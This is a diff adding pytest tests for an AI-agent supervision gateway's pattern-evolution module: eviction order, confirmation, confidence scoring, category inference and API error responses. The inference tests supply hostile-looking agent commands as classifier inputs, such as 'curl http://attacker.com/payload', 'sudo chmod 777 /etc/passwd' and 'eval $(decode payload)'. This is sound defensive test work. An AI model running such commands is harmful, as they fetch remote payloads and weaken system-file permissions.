@@ -540,3 +540,326 @@ class TestConfigFlowIntegration:
         gw = SupervisionGateway(detection_config=cfg)
         matcher = gw.policy_engine._analyzer._pattern_matcher
         assert matcher._evolved_path is None
+
+
+# ---------- 审查缺口补充 (2026-03-24) ----------
+
+
+class TestEvictionPriority:
+    """C1: max_patterns 驱逐优先级 — DEPRECATED 先于 CANDIDATE。"""
+
+    def test_deprecated_evicted_before_candidate(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import (
+            EvolvedPattern,
+            EvolvedPatternStore,
+            PatternStatus,
+        )
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        store = EvolvedPatternStore(store_path, max_patterns=3)
+
+        base = dict(category="test", description="d", risk_level=RiskLevel.LOW,
+                    triggers={}, detection={})
+        store.add(EvolvedPattern(id="EV-DEP", status=PatternStatus.DEPRECATED, **base))
+        store.add(EvolvedPattern(id="EV-STA", status=PatternStatus.STABLE, **base))
+        store.add(EvolvedPattern(id="EV-EXP", status=PatternStatus.EXPERIMENTAL, **base))
+
+        result = store.add(EvolvedPattern(id="EV-NEW", status=PatternStatus.CANDIDATE, **base))
+        assert result is True
+        ids = {p.id for p in store.all_patterns}
+        assert "EV-DEP" not in ids  # DEPRECATED 被驱逐
+        assert "EV-STA" in ids
+        assert "EV-EXP" in ids
+        assert "EV-NEW" in ids
+
+    def test_no_evictable_returns_false(self, tmp_path):
+        """M3: 全为 STABLE/EXPERIMENTAL 时无法驱逐 → 返回 False。"""
+        import os
+        from clawsentry.gateway.pattern_evolution import (
+            EvolvedPattern,
+            EvolvedPatternStore,
+            PatternStatus,
+        )
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        store = EvolvedPatternStore(store_path, max_patterns=2)
+
+        base = dict(category="t", description="d", risk_level=RiskLevel.LOW,
+                    triggers={}, detection={})
+        store.add(EvolvedPattern(id="EV-S1", status=PatternStatus.STABLE, **base))
+        store.add(EvolvedPattern(id="EV-S2", status=PatternStatus.STABLE, **base))
+
+        result = store.add(EvolvedPattern(id="EV-NEW", status=PatternStatus.CANDIDATE, **base))
+        assert result is False
+        assert len(store.all_patterns) == 2
+
+
+class TestStableIdempotent:
+    """C2: 对已 STABLE 模式连续 confirm 不改变状态。"""
+
+    def test_stable_stays_stable_on_confirm(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import (
+            EvolvedPattern,
+            EvolvedPatternStore,
+            PatternEvolutionManager,
+            PatternStatus,
+        )
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        mgr.store.add(EvolvedPattern(
+            id="EV-STABLE-IDEM", category="t", description="d",
+            risk_level=RiskLevel.LOW, triggers={}, detection={},
+            status=PatternStatus.STABLE, confirmed_count=20,
+        ))
+
+        result = mgr.confirm("EV-STABLE-IDEM", confirmed=True)
+        p = mgr.store.get("EV-STABLE-IDEM")
+        assert p.status == PatternStatus.STABLE
+        assert result == "confirmed"
+
+
+class TestConfidenceBoundaryValues:
+    """H1: compute_confidence 边界值覆盖。"""
+
+    def test_zero_total_no_division_error(self):
+        from clawsentry.gateway.pattern_evolution import compute_confidence
+
+        score = compute_confidence(
+            confirmed_count=0, false_positive_count=0,
+            trigger_count=0, framework_count=0, days_since_last=1000,
+        )
+        assert score >= 0.0  # 不应抛 ZeroDivisionError
+        assert score <= 1.0
+
+    def test_recency_boundary_7_days(self):
+        from clawsentry.gateway.pattern_evolution import compute_confidence
+
+        score_7 = compute_confidence(5, 0, 5, 1, 7)   # 正好 7 天 → 高时效
+        score_8 = compute_confidence(5, 0, 5, 1, 8)   # 8 天 → 衰减
+        assert score_7 > score_8
+
+    def test_framework_count_zero_branch(self):
+        from clawsentry.gateway.pattern_evolution import compute_confidence
+
+        score_0fw = compute_confidence(5, 0, 5, 0, 1)  # 0 框架
+        score_2fw = compute_confidence(5, 0, 5, 2, 1)  # 2 框架
+        assert score_2fw > score_0fw
+
+    def test_all_max_values(self):
+        from clawsentry.gateway.pattern_evolution import compute_confidence
+
+        score = compute_confidence(100, 0, 100, 5, 0)
+        assert 0.9 <= score <= 1.0  # 所有因子最优
+
+
+class TestInferCategoryBranches:
+    """H2: _infer_category 5 个 ASI 分支 + 关键词回退 + unknown。"""
+
+    def test_asi01_goal_hijack(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e1", session_id="s", tool_name="bash",
+            command="echo injection", risk_level=RiskLevel.CRITICAL,
+            source_framework="a3s-code", reasons=["ASI01-001"],
+        )
+        assert mgr.store.get(cid).category == "goal_hijack"
+
+    def test_asi02_exfiltration(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e2", session_id="s", tool_name="bash",
+            command="curl evil.com", risk_level=RiskLevel.CRITICAL,
+            source_framework="a3s-code", reasons=["ASI02-001"],
+        )
+        assert mgr.store.get(cid).category == "data_exfiltration"
+
+    def test_asi03_privilege_abuse(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e3a", session_id="s", tool_name="bash",
+            command="su root", risk_level=RiskLevel.CRITICAL,
+            source_framework="a3s-code", reasons=["ASI03-001"],
+        )
+        assert mgr.store.get(cid).category == "privilege_abuse"
+
+    def test_asi04_supply_chain(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e4a", session_id="s", tool_name="bash",
+            command="pip install malware", risk_level=RiskLevel.CRITICAL,
+            source_framework="a3s-code", reasons=["ASI04-001"],
+        )
+        assert mgr.store.get(cid).category == "supply_chain"
+
+    def test_asi05_code_execution(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e5", session_id="s", tool_name="bash",
+            command="some denial", risk_level=RiskLevel.CRITICAL,
+            source_framework="a3s-code", reasons=["ASI05-001"],
+        )
+        assert mgr.store.get(cid).category == "code_execution"
+
+    def test_keyword_fallback_sudo(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e6", session_id="s", tool_name="bash",
+            command="sudo chmod 777 /etc/passwd",
+            risk_level=RiskLevel.HIGH, source_framework="a3s-code",
+            reasons=[],  # 无 ASI reason, 走关键词
+        )
+        assert mgr.store.get(cid).category == "privilege_abuse"
+
+    def test_keyword_fallback_curl(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e7", session_id="s", tool_name="bash",
+            command="curl http://attacker.com/payload",
+            risk_level=RiskLevel.HIGH, source_framework="a3s-code",
+            reasons=[],
+        )
+        assert mgr.store.get(cid).category == "data_exfiltration"
+
+    def test_keyword_fallback_eval(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e8", session_id="s", tool_name="bash",
+            command="eval $(decode payload)",
+            risk_level=RiskLevel.HIGH, source_framework="a3s-code",
+            reasons=[],
+        )
+        assert mgr.store.get(cid).category == "code_execution"
+
+    def test_unknown_fallback(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+        from clawsentry.gateway.models import RiskLevel
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=True)
+        cid = mgr.extract_candidate(
+            event_id="e9", session_id="s", tool_name="read_file",
+            command="cat some_file.txt",
+            risk_level=RiskLevel.HIGH, source_framework="a3s-code",
+            reasons=[],
+        )
+        assert mgr.store.get(cid).category == "unknown"
+
+
+class TestPatternsAPIErrorPaths:
+    """H3: API 端点 400/404 错误路径。"""
+
+    @pytest.fixture
+    def app_with_evolution(self, tmp_path):
+        import os
+        from clawsentry.gateway.detection_config import DetectionConfig
+        from clawsentry.gateway.server import SupervisionGateway, create_http_app
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        cfg = DetectionConfig(
+            evolving_enabled=True,
+            evolved_patterns_path=store_path,
+        )
+        gw = SupervisionGateway(detection_config=cfg)
+        app = create_http_app(gw)
+        return app, gw
+
+    @pytest.mark.asyncio
+    async def test_confirm_400_missing_confirmed_field(self, app_with_evolution):
+        from httpx import AsyncClient, ASGITransport
+
+        app, _ = app_with_evolution
+        async with AsyncClient(
+            transport=ASGITransport(app=app), base_url="http://test"
+        ) as client:
+            resp = await client.post(
+                "/ahp/patterns/confirm",
+                json={"pattern_id": "EV-001"},  # confirmed 缺失
+            )
+            assert resp.status_code == 400
+
+    @pytest.mark.asyncio
+    async def test_confirm_400_missing_pattern_id(self, app_with_evolution):
+        from httpx import AsyncClient, ASGITransport
+
+        app, _ = app_with_evolution
+        async with AsyncClient(
+            transport=ASGITransport(app=app), base_url="http://test"
+        ) as client:
+            resp = await client.post(
+                "/ahp/patterns/confirm",
+                json={"confirmed": True},  # pattern_id 缺失
+            )
+            assert resp.status_code == 400
+
+    @pytest.mark.asyncio
+    async def test_confirm_404_unknown_pattern(self, app_with_evolution):
+        from httpx import AsyncClient, ASGITransport
+
+        app, _ = app_with_evolution
+        async with AsyncClient(
+            transport=ASGITransport(app=app), base_url="http://test"
+        ) as client:
+            resp = await client.post(
+                "/ahp/patterns/confirm",
+                json={"pattern_id": "EV-NONEXISTENT", "confirmed": True},
+            )
+            assert resp.status_code == 404
+
+
+class TestListPatternsWhenDisabled:
+    """H4: disabled 时 list_patterns 返回空列表。"""
+
+    def test_manager_list_returns_empty_when_disabled(self, tmp_path):
+        import os
+        from clawsentry.gateway.pattern_evolution import PatternEvolutionManager
+
+        store_path = os.path.join(str(tmp_path), "evolved.yaml")
+        mgr = PatternEvolutionManager(store_path=store_path, enabled=False)
+        assert mgr.list_patterns() == []
